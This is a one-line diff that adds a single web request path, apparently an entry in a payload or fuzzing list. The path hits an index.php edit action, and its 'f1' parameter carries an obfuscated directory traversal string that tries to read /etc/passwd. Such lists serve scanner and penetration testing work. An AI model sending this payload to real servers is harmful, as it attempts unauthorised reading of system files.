@@ -1,0 +1,1 @@
+/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1
